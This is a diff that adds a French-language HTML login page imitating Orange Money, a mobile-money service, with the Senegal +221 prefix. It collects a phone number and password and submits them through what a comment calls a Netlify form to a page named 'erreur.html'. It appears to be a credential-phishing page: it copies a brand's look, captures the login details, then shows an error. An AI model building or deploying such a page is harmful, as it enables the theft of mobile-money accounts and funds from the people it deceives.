@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion à Orange Money</title>
+    <!-- Lien vers FontAwesome pour les icônes -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <!-- Favicon (icône de l'onglet) -->
+    <link rel="icon" href="orange.png" type="image/x-icon">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+        .login-container h2 {
+            margin-bottom: 20px;
+            color: #ff6600;
+            font-size: 24px;
+        }
+        .login-container .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        .login-container .input-group {
+            position: relative;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+        }
+        .login-container .input-group i {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #888;
+        }
+        .login-container .input-group .country-code {
+            width: 60px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 6px 0 0 6px;
+            font-size: 14px;
+            background-color: #f9f9f9;
+            text-align: center;
+            margin-right: -1px; /* Pour aligner avec le champ de saisie */
+        }
+        .login-container .input-group input {
+            width: 100%;
+            padding: 10px 10px 10px 40px;
+            border: 1px solid #ccc;
+            border-radius: 0 6px 6px 0;
+            font-size: 16px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #ff6600;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .login-container button:hover {
+            background-color: #e65c00;
+        }
+        .login-container a {
+            color: #ff6600;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-top: 10px;
+        }
+        .login-container a:hover {
+            text-decoration: underline;
+        }
+        .login-container .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Logo Orange -->
+        <img src="orange.png" alt="Orange Logo" class="logo">
+        <h2>Connexion à Orange Money</h2>
+        <!-- Formulaire Netlify -->
+        <form name="login-form" method="POST" action="erreur.html">
+            <!-- Champ de numéro de téléphone avec code pays fixe -->
+            <div class="input-group">
+                <div class="country-code">+221</div>
+                <i class="fas fa-phone"></i>
+                <input type="tel" id="phone" name="phone" placeholder="Numéro de téléphone" required>
+            </div>
+            <!-- Champ de mot de passe -->
+            <div class="input-group">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+            </div>
+            <button type="submit">Se connecter</button>
+        </form>
+        <a href="#">Mot de passe oublié ?</a>
+        <div class="footer">
+            <p>En cliquant sur "Se connecter", vous acceptez nos <a href="#">Conditions d'utilisation</a>.</p>
+        </div>
+    </div>
+</body>
+</html>
